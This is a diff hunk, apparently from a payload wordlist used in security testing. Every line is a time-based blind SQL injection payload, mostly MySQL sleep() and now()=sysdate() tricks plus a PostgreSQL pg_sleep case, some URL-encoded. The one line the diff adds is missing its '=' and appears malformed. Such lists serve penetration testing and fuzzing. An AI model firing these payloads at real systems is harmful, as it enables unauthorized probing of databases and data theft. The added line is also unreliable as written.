@@ -3,6 +3,7 @@
 'XOR(if(now()=sysdate()%2Csleep(10)%2C0))XOR'Z
 'XOR(if(now()=sysdate(),sleep(5*5),0))OR'
 if(now()=sysdate(),sleep(3),0)/*'XOR(if(now()=sysdate(),sleep(3),0))OR'"XOR(if(now()=sysdate(),sleep(3),0))OR"*/
+if(now()sysdate()%2Csleep(10)%2C0)
 ;SELECT CASE WHEN (1=1) THEN pg_sleep(7) ELSE pg_sleep(0) END--
 %2c(select*from(select(sleep(30)))a)
 (select*from(select(sleep(30)))a)
